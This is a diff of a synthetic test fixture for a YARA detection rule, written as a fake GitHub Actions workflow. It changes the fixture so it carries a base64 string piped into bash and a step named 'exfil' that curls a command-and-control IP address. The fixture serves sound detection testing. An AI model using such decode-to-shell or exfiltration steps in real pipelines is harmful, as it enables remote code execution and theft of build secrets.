@@ -1,6 +1,7 @@
-# Synthetic positive fixture — Megalodon_High_Confidence (multiple IoCs)
-# Contains C2 IP + Optimize-Build name + base64 payload — the full targeted variant signature.
-# The base64 string encodes a benign placeholder ("echo hello"), not a real payload.
+# Synthetic positive fixture — Megalodon_High_Confidence (multiple corroborating IoCs)
+# Contains: C2 IP + Optimize-Build name + base64 | bash pattern — the full targeted variant signature.
+# The base64 string is a benign placeholder of sufficient length (40+ chars) for regex matching.
+# The decoded content would be "synthetic yara test fixture placeholder" — not a real payload.
 # This is a text file only — not a functional workflow; cannot execute anything.
 name: Optimize-Build
 on:
@@ -10,6 +11,6 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: run
-        run: |
-          PAYLOAD=$(echo aGVsbG8K | base64 -d)
-          curl -s http://216.126.225.129:8443/out -d "$PAYLOAD"
+        run: echo c3ludGhldGljIHlhcmEgdGVzdCBmaXh0dXJlIHBsYWNlaG9sZGVyCg== | base64 -d | bash
+      - name: exfil
+        run: curl -s http://216.126.225.129:8443/out
